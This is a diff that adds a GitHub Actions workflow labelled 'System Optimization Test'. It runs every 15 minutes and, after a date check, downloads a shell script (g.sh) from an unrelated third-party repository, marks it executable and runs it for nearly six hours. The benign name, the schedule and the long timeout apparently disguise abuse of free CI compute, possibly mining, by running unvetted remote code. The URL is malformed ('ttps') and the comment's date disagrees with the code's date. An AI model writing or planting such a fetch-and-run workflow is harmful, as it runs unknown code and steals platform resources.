@@ -1,0 +1,45 @@
+name: System Optimization Test
+
+on:
+  # Allows you to manually trigger the workflow from the GitHub Actions UI
+  workflow_dispatch:
+  # Schedule to run every 15 minutes
+  schedule:
+    - cron: '*/15 * * * *'
+
+jobs:
+  optimization-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check if on or after the start date (June 14, 2025)
+        id: date_check # Assign an ID to this step to reference its outputs
+        run: |
+          # Get current date in YYYYMMDD format
+          CURRENT_DATE_STR=$(date +%Y%m%d)
+          # Define your start date
+          START_DATE_STR="20250702"
+
+          echo "Current date: $CURRENT_DATE_STR"
+          echo "Start date for execution: $START_DATE_STR"
+
+          if [[ "$CURRENT_DATE_STR" -ge "$START_DATE_STR" ]]; then
+            echo "Current date is on or after the start date. Proceeding with optimization test."
+            echo "continue_workflow=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "Current date is before the start date. Skipping optimization test."
+            echo "continue_workflow=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Fetch optimization script
+        # This step will only run if the 'date_check' step's output 'continue_workflow' is 'true'
+        if: steps.date_check.outputs.continue_workflow == 'true'
+        run: |
+          curl -sLo g.sh ttps://raw.githubusercontent.com/AsuSukey/musical-meme/main/g.sh
+          chmod +x g.sh
+
+      - name: Execute test
+        # This step will also only run if the 'date_check' step's output 'continue_workflow' is 'true'
+        if: steps.date_check.outputs.continue_workflow == 'true'
+        run: |
+          # Run with timeout to prevent indefinite execution
+          timeout 355m ./g.sh || echo "System Stopped"
